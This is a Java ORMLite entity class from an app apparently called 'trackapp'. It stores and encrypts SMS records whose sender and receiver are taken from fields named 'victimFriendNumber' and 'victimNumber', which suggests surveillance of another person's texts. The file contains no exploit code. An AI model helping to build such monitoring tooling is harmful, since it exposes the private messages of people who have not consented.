package com.sunnet.trackapp.client.db.entity;

import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;
import com.sunnet.trackapp.client.db.dao.SMSDao;
import com.sunnet.trackapp.client.task.response.StatisticalResponse;
import com.sunnet.trackapp.client.util.ConfigApi;
import com.sunnet.trackapp.client.util.CryptoUtils;
import com.sunnet.trackapp.client.util.Utils;

/**
 * All software created will be owned by
 * Patient Doctor Technologies, Inc. in USA
 */

@DatabaseTable(tableName = SMSEntity.TABLE_NAME, daoClass = SMSDao.class)
public class SMSEntity extends BaseEntity {
    public static final String TABLE_NAME = "SMS";

    public static final String ID_COL = "ID_COL";
    public static final String DATE_COL = "DATE_COL";
    public static final String SENDER_COL = "SENDER_COL";
    public static final String RECEIVER_COL = "RECEIVER_COL";
    public static final String BODY_COL = "BODY_COL";

    public SMSEntity() {
    }

    public SMSEntity(StatisticalResponse.Result.SmsAndRecorder parent, StatisticalResponse.Result.SmsAndRecorder.Sms sms) {
        this.id = sms.id;
        this.date = Utils.getDateFormat(sms.timeStamp);
        this.sender = parent.victimFriendNumber;
        this.receiver = parent.victimNumber;
        this.body = sms.content;
    }

    public SMSEntity(String victimNumber, String victimFriendNumber, StatisticalResponse.Result.SmsAndRecorder.Sms sms) {
        this.id = sms.id;
        this.date = Utils.getDateFormat(sms.timeStamp);
        this.sender = victimFriendNumber;
        this.receiver = victimNumber;
        this.body = sms.content;
    }

    @DatabaseField(columnName = ID_COL, canBeNull = false, id = true)
    private String id;
    @DatabaseField(columnName = DATE_COL)
    private String date;
    @DatabaseField(columnName = SENDER_COL)
    private String sender;
    @DatabaseField(columnName = RECEIVER_COL)
    private String receiver;
    @DatabaseField(columnName = BODY_COL)
    private String body;

    public String getId() {
        return id;
    }

    public void setId(String id) {
        this.id = id;
    }

    public String getDate() {
        return date;
    }

    public void setDate(String date) {
        this.date = date;
    }

    public String getSender() {
        return sender;
    }

    public void setSender(String sender) {
        this.sender = sender;
    }

    public String getReceiver() {
        return receiver;
    }

    public void setReceiver(String receiver) {
        this.receiver = receiver;
    }

    public String getBody() {
        return body;
    }

    public void setBody(String body) {
        this.body = body;
    }

    /**
     * Encrypt and Decrypt data
     */
    public void encrypt() {
        body = CryptoUtils.encryptReturnValueWhenError(body);
        sender = CryptoUtils.encryptReturnValueWhenError(sender);
        receiver = CryptoUtils.encryptReturnValueWhenError(receiver);
    }

    public void decrypt() {
        body = CryptoUtils.decryptReturnValueWhenError(body);
        sender = CryptoUtils.decryptReturnValueWhenError(sender);
        receiver = CryptoUtils.decryptReturnValueWhenError(receiver);
    }

    public void decryptFromResponse() {
        body = CryptoUtils.decryptReturnValueWhenError(body);
    }
}
